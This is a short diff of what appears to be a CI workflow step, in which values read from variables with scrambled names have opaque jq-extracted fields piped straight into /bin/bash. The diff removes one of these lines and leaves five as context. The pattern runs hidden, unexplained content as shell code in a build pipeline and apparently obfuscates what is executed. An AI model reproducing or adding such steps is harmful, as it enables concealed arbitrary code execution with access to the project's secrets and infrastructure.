@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$h55997" | jq -r .tepk089 | /bin/bash
           echo $vi2 | jq -r .jwvac8 | /bin/bash
-          echo $klker8 | jq -r .ftda956 | /bin/bash
           echo $qcjx08 | jq -r .vbm78080 | /bin/bash
           echo $h1 | jq -r .xeqgg57483 | /bin/bash
           echo $a4009 | jq -r .eiv685 | /bin/bash
